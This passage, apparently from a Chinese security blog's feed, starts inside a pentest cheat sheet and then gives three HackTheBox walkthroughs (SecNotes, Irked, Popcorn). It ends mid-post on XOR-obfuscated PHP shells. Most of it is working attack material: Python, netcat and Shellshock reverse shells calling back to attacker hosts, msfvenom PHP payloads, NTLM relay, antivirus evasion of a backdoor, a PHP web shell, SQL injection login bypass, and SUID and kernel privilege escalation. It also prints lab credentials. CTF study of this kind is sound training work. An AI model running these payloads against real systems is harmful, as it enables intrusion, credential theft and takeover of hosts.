dump<br></code></pre></td></tr></table></figure><p>sqlmap检查表单注入</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">"http://meh.com/form/"</span> –forms<br></code></pre></td></tr></table></figure><p>dump数据库</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">"http://meh/vuln-form"</span> --forms -D database-name -T users –dump<br></code></pre></td></tr></table></figure><p>刷新会话</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --flush session<br></code></pre></td></tr></table></figure><p>尝试使用布尔技术来利用“用户”字段。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -p user --technique=B<br></code></pre></td></tr></table></figure><p>Post</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r demo.txt<br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>使用mitm6的NTLMRelayx.py</p><p>使用mitm6通过IPv6欺骗获取捕获的凭据，并通过ntlmrelayx.py将其转发到目标。它需要安装ntlmrelayx.py和mitm6。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitm6 -d &lt;domain.local&gt;<br><br>ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/<br></code></pre></td></tr></table></figure><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshuttle -r root@10.0.0.1 10.10.10.0/24<br></code></pre></td></tr></table></figure><h3 id="AV-Bypass"><a href="#AV-Bypass" class="headerlink" title="AV Bypass"></a>AV Bypass</h3><p>需要安装wine和hyperion。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe<br></code></pre></td></tr></table></figure><h3 id="Web主机（传输文件）"><a href="#Web主机（传输文件）" class="headerlink" title="Web主机（传输文件）"></a>Web主机（传输文件）</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer 80<br></code></pre></td></tr></table></figure><h3 id="PHP-msf-shell"><a href="#PHP-msf-shell" class="headerlink" title="PHP msf shell"></a>PHP msf shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R &gt; phpmeterpreter.php<br></code></pre></td></tr></table></figure><h3 id="Netcat-1"><a href="#Netcat-1" class="headerlink" title="Netcat"></a>Netcat</h3><p>监听</p><p>nc -lvp <PORT></PORT></p><p>反弹</p><p>nc -e /bin/bash ip port</p><p>ncat -v -l -p 7777 -e /bin/bash</p><p>通过ncat下载文件</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat happy.txt | ncat -v -l -p 5555 <br>ncat localhost 5555 &gt; happy_copy.txt<br></code></pre></td></tr></table></figure><h3 id="使用解释器反弹shell"><a href="#使用解释器反弹shell" class="headerlink" title="使用解释器反弹shell"></a>使用解释器反弹shell</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p><p>Python</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><br></code></pre></td></tr></table></figure><h3 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h3><p>CURL</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x TARGETADDRESS -H <span class="hljs-string">"User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/HOSTIP/1234 0&gt;&amp;1"</span> TARGETADDRESS/cgi-bin/status<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x 192.168.28.167:PORT -H <span class="hljs-string">"User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.28.169/1234 0&gt;&amp;1"</span> 192.168.28.167/cgi-bin/status<br></code></pre></td></tr></table></figure><p>SSH</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IPADDRESS <span class="hljs-string">'() &#123; :;&#125;; /bin/bash'</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTehBox-SecNotes</title>
      <link href="/posts/8e5dfaea.html"/>
      <url>/posts/8e5dfaea.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1dvGeaBaE3KVjSZLe760sSFXaw.png"></p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV 10.10.10.97<br></code></pre></td></tr></table></figure><p>开放了80、445、8808三个端口</p><p><img src="https://ae01.alicdn.com/kf/HTB1h2ejaBCw3KVjSZFl763JkFXaE.png"><br>访问80端口，是个登录页面，注册一个账号</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user:<span class="hljs-string">' w'</span>or 1=<span class="hljs-string">'1</span><br><span class="hljs-string">pass:'</span> w<span class="hljs-string">'or 1='</span>1<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1gWyfaCWD3KVjSZSg763CxVXaP.png" alt="s"></p><p>注册成功，使用【w’or 1=’1】登录，发现第三个笔记疑似smb之类的账号密码</p><p><img src="https://ae01.alicdn.com/kf/HTB1w95larus3KVjSZKb760qkFXat.png"></p><p>使用 smbclient 尝试登录smb,用户：<code>Tyler</code>，密码：<code>92g!mA8BGjOirkL%OG*&amp;</code></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //10.10.10.97/new-site -U Tyler<br></code></pre></td></tr></table></figure><p>登录后发现该目录是web服务8808端口的根目录</p><p><img src="https://ae01.alicdn.com/kf/HTB1p4yjaBCw3KVjSZFu763AOpXa6.png"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传一句话马</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">put x.php   <span class="hljs-comment">#注意，要把php放到当前运行目录下才能上传，不然不报错</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'x'</span>]))&#123;<br>  $cmd = ($_REQUEST[<span class="hljs-string">'x'</span>]);<br>  system($cmd);<br>  <span class="hljs-keyword">die</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1ycSdaEWF3KVjSZPh760clXXaF.png"></p><p>这里要注意的是，目标机好像不是很稳定，不是php马被删就是smb断开连接，所以下面上传个nc通过之前上传的php马执行反弹一个shell回来</p><figure class="hljs highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://10.10.10.97:8808/atom.php?cmd=nc<span class="hljs-number">%2010</span>.10.14.24<span class="hljs-number">%201337</span><span class="hljs-number">%20</span>-e<span class="hljs-number">%20</span>cmd.exe<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1aDacawKG3KVjSZFL761MvXXaI.png"></p><p>在<code>wwwroot</code>目录下找到连接数据库文件<code>db.php</code></p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> ($includes != <span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR: Should not access directly."</span>);<br>&#125;<br><br><span class="hljs-comment">/* Database credentials. Assuming you are running MySQL</span><br><span class="hljs-comment">server with default setting (user 'root' with no password) */</span><br>define(<span class="hljs-string">'DB_SERVER'</span>, <span class="hljs-string">'localhost'</span>);<br>define(<span class="hljs-string">'DB_USERNAME'</span>, <span class="hljs-string">'secnotes'</span>);<br>define(<span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'q8N#9Eos%JinE57tke72'</span>);<br><span class="hljs-comment">//define('DB_USERNAME', 'root');</span><br><span class="hljs-comment">//define('DB_PASSWORD', 'qwer1234QWER!@#$');</span><br>define(<span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'secnotes'</span>);<br><br><span class="hljs-comment">/* Attempt to connect to MySQL database */</span><br>$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br>     <br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span>($link === <span class="hljs-keyword">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR: Could not connect. "</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数据库连接文件暂时不管它了，先找<code>user.txt</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1KeCdaECF3KVjSZJn762nHFXaf.png"></p><p>在桌面找到user.txt，还发现了个可疑的<code>bash.lnk</code>,运行该bash报错不存在，那就查找下真正路径在哪吧，找到完整路径后重新执行运行bash</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">where</span> /R c:\ bash.exe<br><br>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1lAijaBGw3KVjSZFD760WEpXaF.png" alt="secnotes8.png"></p><p>为了方便，使用python反弹个交互式的shell会话</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span><br></code></pre></td></tr></table></figure><p>查看历史命令，发现曾经使用明文密码登录过smb</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -U <span class="hljs-string">'administrator%u6!4ZwgwOM#^OBf#Nwnh'</span> \\\\127.0.0.1\\c$<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1e9ueaBWD3KVjSZFs763qkpXaH.png"></p><p>登录smb，在桌面找到root.txt</p><p><img src="https://ae01.alicdn.com/kf/HTB1GlGdaA9E3KVjSZFG76319XXau.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Irked</title>
      <link href="/posts/ae29f7a1.html"/>
      <url>/posts/ae29f7a1.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB14mSfaCWD3KVjSZSgq6ACxVXaU.jpg"></p><a id="more"></a><div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=428642586&auto=1&height=66"></iframe></div><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描目标机器开放的端口"><a href="#扫描目标机器开放的端口" class="headerlink" title="扫描目标机器开放的端口"></a>扫描目标机器开放的端口</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">masscan -p1-65535 10.10.10.117 --rate=1000 -e tun0 &gt; ports<br><br>ports=$(cat ports | awk -F <span class="hljs-string">" "</span> <span class="hljs-string">'&#123;print $4&#125;'</span> | awk -F <span class="hljs-string">"/"</span> <span class="hljs-string">'&#123;print $1&#125;'</span> | sort -n | tr ​<span class="hljs-string">'\n'</span>​ ​<span class="hljs-string">','</span>​ | sed <span class="hljs-string">'s/,$//'</span>)<br><br>nmap -Pn -A -sV -sC -p<span class="hljs-variable">$ports</span> 10.10.10.117<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB17_edaEKF3KVjSZFE760ExFXaM.png"></p><p>目标机上运行着http服务，使用<code>gobuster</code>爆了下目录，没有发现什么。</p><p>访问下web站点，似乎发现了些什么，<code>IRC is almost working!</code>, 在回看nmap扫描输出信息<code>6697</code>和<code>8067</code>端口上就运行着<code>IRC</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1u.OdaEuF3KVjSZK9762VtXXat.png"></p><h3 id="使用HexChat连接到目标机"><a href="#使用HexChat连接到目标机" class="headerlink" title="使用HexChat连接到目标机"></a>使用HexChat连接到目标机</h3><p>nmap没探测出关于IRC更多的信息，所以使用hexchat连接目标，看看是否能找到其他信息。例如版本号之类的。</p><p>由于kali上没有 <code>HexChat</code> 所以先安装该工具</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install hexchat -y<br></code></pre></td></tr></table></figure><p>启动 Hexchat 添加新连接</p><p><img src="https://ae01.alicdn.com/kf/HTB14uykaBCw3KVjSZR0762cUpXaq.png"></p><p>连接成功，版本是<code>Unreal 3.2.1</code>, 搜索一下该版本有什么漏洞</p><p><img src="https://ae01.alicdn.com/kf/HTB1enidavWG3KVjSZFP760aiXXaz.png"></p><p>搜索到以下几个漏洞</p><p><img src="https://ae01.alicdn.com/kf/HTB1__Omaq5s3KVjSZFN763D3FXal.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1QYKdaxiH3KVjSZPf760BiVXaC.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/irc/unreal_ircd_3281_backdoor<br><span class="hljs-built_in">set</span> payload cmd/unix/reverse_perl<br><span class="hljs-built_in">set</span> RHOST 10.10.10.117  <span class="hljs-comment">#目标</span><br><span class="hljs-built_in">set</span> RPORT 6697          <span class="hljs-comment">#目标端口</span><br><span class="hljs-built_in">set</span> LHOST 10.10.13.129  <span class="hljs-comment">#kali</span><br>run<br></code></pre></td></tr></table></figure><p>成功得到shell会话</p><p><img src="https://ae01.alicdn.com/kf/HTB1JmWjaBGw3KVjSZFw762Q2FXaL.png"></p><p>为了方便，这里使用python弹个交互式的shell</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span><br></code></pre></td></tr></table></figure><p><strong>寻找flag（user.txt）</strong></p><p>经过查找，发现 <code>user.txt</code> 在另外一个用户 <code>Documents</code>目录下，但现在的用户无法cat user.txt。后面检查了当前用户执行过的命令，发曾经cat过和user.txt同目录下的<code>.backup</code>文件。当我cat该文件时，提示这个是备份密码。尝试ssh却发现密码错误无法登录。</p><p><img src="https://ae01.alicdn.com/kf/HTB1bzufaBWD3KVjSZKP761p7FXaj.png"></p><p>后面在官方论坛该靶机板块下找到了些提示：<code>Stego工具应与密码一起使用，首先找到Stego秘密吗，然后使用流行的Stego工具</code> (机器翻译的勉强看吧)。</p><p>按照提示，猜测应该是用类似 <code>MP3Stego</code> 之类的工具输入密码解密从而得到新的文件。后面在网上搜索到了kali上有个<code>steghide</code>的工具可以解密</p><p>安装steghide</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure><p>在解密前，先把<code>web</code>站点上的那张黄脸图片下载到本地然后使用以下命令并输入密码解密，密码为<code>.backup</code>里面<code>UP</code>的开头的字符串，然后得到个<code>pass.txt</code>，文件内容就是另一个用户的ssh登录密码</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf irked.jpg<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1lsqfaAWE3KVjSZSy760ocXXaR.png"></p><p><strong>提权cat roo.txt</strong></p><p>查找可利用带有SUID的文件、命令</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null -<span class="hljs-built_in">exec</span> ls -l &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>发现个可疑的<code>viewuser</code>命令，执行该命令报错提示找不到<code>/tmp/listusers</code>，嗯，这里利用一波，在/tmp下创建一个名为<code>listusers</code>的sh脚本。脚本里面可以写入增加个特权用户、修改root密码或者把当前用户加入到管理员组之类的命令</p><p><img src="https://ae01.alicdn.com/kf/HTB1OH5daxiH3KVjSZPf760BiVXaU.png"></p><p>这里我写入修改root密码，sh脚本命令如下：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> root:Aa@1234567890 | /usr/sbin/chpasswd<br></code></pre></td></tr></table></figure><p>修改权限为777，然后执行</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod 777 listusers<br>/usr/bin/viewuser`<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1bPefaBWD3KVjSZKP761p7FXaJ.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Popcorn</title>
      <link href="/posts/111fdf1c.html"/>
      <url>/posts/111fdf1c.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB17aKoaqWs3KVjSZFx761WUXXa4.png"></p><a id="more"></a><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>在靶机中找到user.txt和root.txt文件</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>用nmap扫描端口信息</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV 10.10.10.6<br></code></pre></td></tr></table></figure><!--more--><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[root@parrot]─[~]<br>└──╼ <span class="hljs-comment">#nmap -sC -sV 10.10.10.6</span><br>Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-16 13:29 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.6<br>Host is up (0.24s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)<br>|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)<br>80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))<br>|_http-server-header: Apache/2.2.12 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">'t have a title (text/html).</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 17.66 seconds</span><br></code></pre></td></tr></table></figure><p>只开了<code>22</code>和<code>80</code>端口</p><p>先使用dirb爆破80端口web服务目录</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://10.10.10.6/ -r<br></code></pre></td></tr></table></figure><p>找到以下目录，其中<code>test</code>下是个phpinfo</p><p><img src="https://ae01.alicdn.com/kf/HTB18uKeawmH3KVjSZKz7622OXXau.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1bjelaBCw3KVjSZR0762cUpXa0.png"></p><p><code>torrent</code> 文件夹比较可疑，浏览器访问<code>http://10.10.10.3/torrent/</code></p><p>简单的浏览了下，发现有上传文件功能。先注册个帐号</p><p><img src="https://ae01.alicdn.com/kf/HTB1rdWeawmH3KVjSZKz7622OXXaI.png"></p><p>完成注册后上传一个<code>.torrent</code>文件,上传成功后跳转到一下页面，点击<code>Edit this torrent</code>按钮，弹出一个可以上传图片的窗口</p><p><img src="https://ae01.alicdn.com/kf/HTB1aCOgaBWD3KVjSZFs763qkpXaM.png"></p><p>先使用msf生成一个反向链接 payload，然后修改尾缀名为<code>.png</code></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw &gt;test.php<br>mv test.php test.php.png<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1OLKlaBCw3KVjSZFl763JkFXat.png"></p><p>burp捉包删除尾缀名<code>.png</code>,然后上传</p><p><img src="https://ae01.alicdn.com/kf/HTB1egCgaBaE3KVjSZLe760sSFXah.png"></p><p>找到上传文件所在目录，一般在<code>upload/</code>下</p><p><img src="https://ae01.alicdn.com/kf/HTB1kmyeav5G3KVjSZPx762I3XXa1.png"></p><p>设置msf监听,然后浏览器打开上传的php <code>shell</code>脚本</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.10.14.6<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1YYKhaBSD3KVjSZFq7634bpXat.png"></p><p>成功反弹shell</p><p>查看系统信息，linux内核为版本<code>2.6.31-14</code>，查找提权exp，这里使用<code>15704.c</code>进行编译提权获取shell会话。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Linux 2.6.3<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1z4ifaEGF3KVjSZFo762mpFXau.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1TgWfaEGF3KVjSZFo762mpFXad.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>把exp上传到目标机上进行编译，提权，cat flag</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/15704.c .<br>shell<br>ls<br>gcc 15704.c -o exp<br>chmod 777 exp &amp;&amp; ./exp<br>./exp<br>ls /home<br>cat /home/george/user.txt<br>cat /root/root.txt<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1i91faA9E3KVjSZFG76319XXa7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python string XOR</title>
      <link href="/posts/b5a2e443.html"/>
      <url>/posts/b5a2e443.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB15q1hawaH3KVjSZFjq6AFWpXau.jpg"></p><a id="more"></a><p>这几天即刻群里的师傅们都讨论PHP shell如何改装从而存活下来，由于自己太菜只能，默默的听大佬们讨论不敢吱声 ~ Orz<br>听大佬们讨论，什么用<code>fopen</code>加载txt里php，<code>xor</code>Str 然后组合之类，听得我一脸懵逼的 0.0  特别是<code>xor</code>,完全不知道那是什么，去查了下php的手册，看完后对于php烂成没模样的我来说更加懵逼了~<br>后面在九世表哥的Blog翻到一篇 <a href="https://422926799.github.io/2019/01/18/No-character-shell-study/" target="_blank" rel="noopener"><strong>No character shell study</strong></a> </p><p><img src="https://ae01.alicdn.com/kf/HTB1qSShaEuF3KVjSZK9q6zVtXXay.jpg"></p><blockquote><p>异或运算是指，取每个字符的ASCII，转成二进制再做运算，运二进制算结果转成ASCII，然后再转成字符串</p></blockquote><p>看到这个，才算数明白了些。但是，怎么知道哪些字符串进行异或运算后会得到我想要的新的字符串呢？于是Google了一波，找到了【通过查ASCII表的符合和字符的异或，打印出所有可能的组合】的py脚本，把轮子扣下来小小修改了一下，唔，very good，这就是我想要的。</p><!--more--><p>代码如下：</p><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 